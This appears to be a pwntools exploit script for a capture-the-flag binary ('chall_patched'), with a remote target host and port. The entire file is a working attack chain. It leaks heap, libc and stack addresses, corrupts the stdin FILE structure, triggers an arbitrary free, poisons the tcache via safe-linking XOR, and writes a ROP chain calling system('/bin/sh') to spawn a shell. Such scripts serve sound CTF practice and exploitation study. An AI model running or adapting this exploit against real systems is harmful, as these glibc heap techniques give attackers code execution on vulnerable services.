```python
#!/usr/bin/env python3

from pwn import *

exe = ELF("./chall_patched", checksec=False)
libc = ELF("./libc.so.6", checksec=False)
ld = ELF("./ld-linux-x86-64.so.2", checksec=False)

context.binary = exe


debug = 1
if args.REMOTE:
    # not fixed yet
    r = remote("103.173.227.108", 9011)
else:
    r = process([exe.path])
    if debug:
        gdb.attach(r, gdbscript='''
            start
            ''')

def set_new_player(name):
    r.sendlineafter(b">>", b"1")
    r.sendlineafter(b">>",b"1")
    r.sendafter(b"Enter name:", name)
    r.sendlineafter(b">>", b"5")


def set_del_player(idx):
    r.sendlineafter(b">>", b"1")
    r.sendlineafter(b">>",b"4")
    r.sendlineafter(b">>", f"{idx}".encode())
    r.sendlineafter(b">>", b"5")


def main():

    for i in range(7):
        set_new_player(b"A")
    set_new_player(b"A")
    set_new_player(b"A")

    for i in range(7):
        set_del_player(i)
    set_del_player(7)
    set_del_player(8)


    set_new_player(b"A\n")
    for i in range(6):
        set_new_player(b"A")

    set_new_player(b"B")

    ## Leak heap
    r.sendlineafter(b">>", b"1")
    r.sendlineafter(b">>", b"2")

    r.recvuntil(b"5. ")
    first = r.recv(6)
    r.recvuntil(b"6. ")
    second = r.recv(6)
    heap = u64(first + b"\x00\x00") ^ u64(second + b"\x00\x00") ^ 0xa0000000000
    heap = heap - 0x200
    print("[*] heap: ", hex(heap))
    first_0x50_chunk = heap + 0x2a0 # idx = 6
    second_0x50_chunk = first_0x50_chunk + 0x50 # idx 5

    print("[*] first 0x50 chunk: ", hex(first_0x50_chunk)) # idx = 6
    print("[*] second 0x50 chunk: ", hex(second_0x50_chunk)) # idx = 5


    ##

    r.sendlineafter(b">>", b"10")



    r.sendlineafter(b">>", b"3") # Edit player
    r.sendlineafter(b">>", b"4294967291") # -5 - stdin

    r.sendlineafter(b">>", b"3") # Edit player
    r.sendafter(b">>", b"a") # -5 -> stdin

    r.recvuntil(p64(0xfbad208b))

    libc.address = u64(r.recv(8)) - 0x203963
    print("[*] libc: ", hex(libc.address))
    print("[*] environ: ", hex(libc.sym['environ']))


    payload = b""

    payload += p64(0xfbad208b)
    payload += p64(libc.address+0x203963+1)
    payload += p64(libc.address+0x203963+1)

    payload += p64(libc.address+0x203963)*5
    r.sendafter(b"new name: ", payload)

    r.sendlineafter(b">>", b"5") #Back
    ###
    # tcache[size=0x50] has one chunk


    set_del_player(5)
    set_new_player(b"A"*0x10+p64(0)+p64(0x51)) # second chunk

    set_del_player(6)
    set_new_player(b"A"*0x10+p64(0)+p64(0x51)) # first chunk

    set_del_player(5)

    # tcache[size=0x50] -> second -> ? chunk
    target = first_0x50_chunk + 0x20
    ###



    r.sendlineafter(b">>", b"6") # feedback
    r.sendlineafter(b"us: ", f"{target}".encode())



    r.sendlineafter(b">>", b"3") # save game
    r.sendline(b"-21") # idx: -21, arbitrary free


    r.sendlineafter(b">>", b"5") # free(ptr)
    # tcache[size=0x50] -> overlap -> second -> ? chunk



    val = (second_0x50_chunk >> 12)^(libc.sym['environ']-0x18)
    set_new_player(b"A"*0x20+p64(0)+p64(0x51)+p64(val)) # idx = 5

    # tcache[size=0x50] -> second -> environ-0x8
    set_new_player(b"second") # idx = 8
    # tcache[size=0x50] -> environ-0x8
    set_new_player(b"A"*0x18) # idx = 9




    r.sendlineafter(b">>", b"1") # set player
    r.sendlineafter(b">>", b"2") # select player
    # good luck pwning :)
    r.recvuntil(b"9. "+b"A"*0x18)
    stack = u64(r.recv(6)+b"\x00\x00")
    print("[*] stack: ", hex(stack))


    r.sendlineafter(b">>", b"10")
    r.sendlineafter(b">>", b"5") # back


    set_del_player(0)
    set_del_player(8)
    set_del_player(5)


    new_val = (second_0x50_chunk >> 12)^(stack-0x158)
    set_new_player(b"A"*0x20+p64(0)+p64(0x51)+p64(new_val)) # idx = 0
    # tcache[size=0x50] -> second -> rbp
    set_new_player(b"second") # idx = 5
    print("[*] rbp: ", hex(stack-0x158))



    pop_rdi = libc.address + 0x000000000010f75b
    binsh = next(libc.search(b"/bin/sh"))
    ret = pop_rdi+1
    system = libc.sym['system']



    payload = p64(0) #rbp
    payload += p64(pop_rdi)
    payload += p64(binsh)
    payload += p64(ret)
    payload += p64(system)

    set_new_player(payload)

    r.interactive()


if __name__ == "__main__":
    main()

```
